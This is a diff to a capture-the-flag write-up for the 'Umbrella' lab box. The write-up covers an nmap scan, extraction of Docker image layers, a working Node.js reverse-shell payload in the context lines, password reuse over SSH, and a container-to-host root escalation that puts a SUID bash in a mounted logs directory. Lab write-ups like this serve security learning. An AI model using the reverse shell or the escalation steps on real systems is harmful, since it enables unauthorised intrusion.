@@ -1,3 +1,5 @@
+# Umbrella box
+
 ```
 # Nmap 7.94 scan initiated Sat Jan 20 08:01:27 2024 as: nmap -sC -sV -sT -T4 -p- -oN box 10.10.94.37
 Nmap scan report for 10.10.94.37
@@ -76,12 +78,12 @@ extract all layer.tars in the layer directories
 for dir in `ls -d */`;
 do
 	pushd $dir
-	tar xvf $dir/layer.tar
+	tar xvf layer.tar
 	popd
 done
 ```
 
-interesting stuff in ceca8630f6b5d6f4eb537a3fff6724b78d2fe1461ff8a7e31dfe44f424c479c7
+interesting stuff in ceca8630f6b5d6f4eb537a3fff6724b78d2fe1461ff8a7e31dfe44f424c479c7 directory
 
 the node app on 8080 is there:
 
@@ -247,5 +249,39 @@ this one works, replace port and IP
 (function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(12345, "127.0.0.1", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
 ```
 
-Dont know much about node.js
+So we are inside the container now, but there are no privesc techniques to explore. All the cgroup vulnerabilities do not work. mount -t cgroup gives permission denied. So no adding mounts and escaping to host this way.
 
+## Logging in over ssh
+
+First try another route and login over ssh (port was open) as claire-r and check for password reuse vulnerability....
+Yep that works! logged in with ssh and get user flag.
+
+But many hours of enumeration did not show anything and finally gave up.
+
+## root
+
+After a good night's sleep and more enumeration I decided looking through the mounts again in the container. And yes that was the key. logs in the container is mounted to the host!
+
+Logged in as claire-r over ssh:
+
+```find / -name logs 2>/dev/null```
+
+and the host directory is...
+
+```/timeTracker-src/logs```
+
+Having previously seen this in other boxes, we should be able to get another shell on the host by copying bash to the log directory in the container and then it appears on the host in the timetracker/logs directory.
+
+```cp /bin/bash .```
+
+Starting bash from the host works now but then id returns claire-r again and root is forbidden.
+
+So as docker runs privileged and we are root inside the container we have to set suid on bash first.
+
+```chmod u+s ./bash```
+
+Then we move to ssh again fire up bash again with the -p flag.
+
+```./bash -p```
+
+and there you go, we are root!
